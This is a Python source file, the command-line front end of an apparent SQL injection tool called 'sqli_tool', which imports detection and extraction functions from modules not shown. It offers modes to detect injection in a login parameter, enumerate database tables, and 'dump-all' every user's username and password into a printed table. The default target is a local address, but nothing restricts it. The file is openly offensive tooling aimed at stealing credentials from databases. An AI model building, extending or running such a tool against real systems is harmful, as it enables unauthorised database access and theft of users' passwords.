# sqli_tool/main.py
import argparse
import sys
import os

# Add parent directory to path so we can import from sqli_tool
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from sqli_tool.detector import test_sqli
from sqli_tool.extractor import (
    discover_db_schema, 
    dump_passwords_all,
    extract_string_threaded
)
from sqli_tool.utils import send_request

def main():
    parser = argparse.ArgumentParser(description="Advanced SQLi Testing Engine v2026")
    parser.add_argument("--url", default="http://127.0.0.1:8000/login", help="Target URL")
    parser.add_argument("--param", default="username", help="Parameter to test")
    parser.add_argument("--method", default="POST", choices=["GET", "POST"], help="HTTP Method")
    parser.add_argument("--mode", required=True, choices=["detect", "discover", "dump-all"], help="Execution mode")
    
    args = parser.parse_args()
    
    base_data = {
        args.param: "base_test",
        "password": "x"
    }

    print(f"\n--- SQLi Enterprise Testing Engine v2026 ---")
    print(f"[*] Target: {args.url}")
    print(f"[*] Parameter: {args.param}")
    print(f"[*] Mode: {args.mode.upper()}")
    print(f"-------------------------------------------")

    if args.mode == "detect":
        # ... (Old detect logic)
        result = test_sqli(args.url, args.param, args.method, base_data)
        if result["vulnerable"]:
            print(f"\n[!] ALERT: Target is vulnerable to SQL Injection!")
        else:
            print(f"\n[-] INFO: No SQLi vulnerability detected.")

    elif args.mode == "discover":
        # Mode 2: Automatically find what tables exist in the DB
        tables = discover_db_schema(args.url, args.param, args.method, base_data)
        print(f"\n\n[+] SCHEDMA DUMP COMPLETE!")
        for t in tables:
            print(f"    - Found Table: {t}")

    elif args.mode == "dump-all":
        # Mode 3: Automatically find all users and their passwords
        data = dump_passwords_all(args.url, args.param, args.method, base_data)
        
        print("\n" + "="*40)
        print(f"{'ID':<5} | {'USERNAME':<15} | {'PASSWORD':<15}")
        print("-" * 40)
        for item in data:
            print(f"{item['id']:<5} | {item['user']:<15} | {item['pass']:<15}")
        print("="*40)

if __name__ == "__main__":
    main()
